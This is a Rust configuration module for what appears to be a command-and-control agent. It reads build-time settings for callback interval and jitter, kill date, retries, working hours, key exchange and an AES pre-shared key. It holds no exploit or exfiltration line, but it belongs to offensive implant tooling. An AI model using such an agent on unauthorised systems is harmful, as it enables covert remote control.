//! This file holds all of the information regarding the C2 and payload build configuration
//! It should be noted that the `env!()` macro will be set during agent compile time instead
//! of run time.
use chrono::{Duration, Local, NaiveTime};
use serde::{Deserialize, Serialize};

/// Structure to hold the http header information
#[derive(Deserialize, Serialize)]
struct Header {
    /// Name for the header
    name: String,

    /// Key of the header json
    key: String,

    /// Value for the header
    value: String,

    /// If this is a custom header
    custom: bool,
}

/// Structure to hold static AES key information
#[derive(Deserialize, Serialize)]
struct Aespsk {
    /// If the PSK is AES or none
    value: String,

    /// Encryption key if it exists
    enc_key: Option<String>,

    /// Decryption key if it exists (should be the same as `enc_key`)
    dec_key: Option<String>,
}

/// Helper function to get the payload UUID
pub fn payload_uuid() -> String {
    // Grab the UUID from the environment variable `UUID`
    String::from(option_env!("UUID").unwrap())
}

/// Helper function to get the configured callback interval
pub fn callback_interval() -> u64 {
    // Grab the callback interval from the environment variable `callback_interval`
    option_env!("callback_interval")
        .unwrap()
        .parse::<u64>()
        .unwrap_or(0)
}

/// Helper function to get the configured callback jitter
pub fn callback_jitter() -> u64 {
    // Grab the callback jitter from the environment variable `callback_jitter`
    option_env!("callback_jitter")
        .unwrap()
        .parse::<u64>()
        .unwrap_or(0)
}

/// Helper function to check if the agent should perform a key exchanged
pub fn encrypted_exchange_check() -> String {
    // Grab the encrypted key exchange option from the environment variable
    // `encrypted_exchange_check`
    // This variable is either set to "T" or "F"
    String::from(option_env!("encrypted_exchange_check").unwrap())
}

/// Helper function to get the kill date for the agent
pub fn killdate() -> String {
    // Grab the kill date from the environment variable `killdate`.
    // If the killdate doesn't exist, set it to 30 days from the current date.
    match option_env!("killdate") {
        Some(date) => String::from(date),
        None => {
            let local = Local::now().naive_local();
            (local + Duration::days(30)).format("%Y-%m-%d").to_string()
        }
    }
}

/// Helper function to get the number of checkin retries
pub fn retries() -> u32 {
    // Grab the checkin retries from the environment variable `connection_retries`
    option_env!("connection_retries")
        .unwrap()
        .parse::<u32>()
        .unwrap_or(1)
}

/// Helper function to get the working hours start time
pub fn working_start() -> NaiveTime {
    let starttime = option_env!("working_hours")
        .unwrap()
        .split('-')
        .next()
        .unwrap();
    NaiveTime::parse_from_str(starttime, "%H:%M").unwrap()
}

/// Helper function to get the working hours end time
pub fn working_end() -> NaiveTime {
    let endtime = option_env!("working_hours")
        .unwrap()
        .split('-')
        .last()
        .unwrap();
    NaiveTime::parse_from_str(endtime, "%H:%M").unwrap()
}
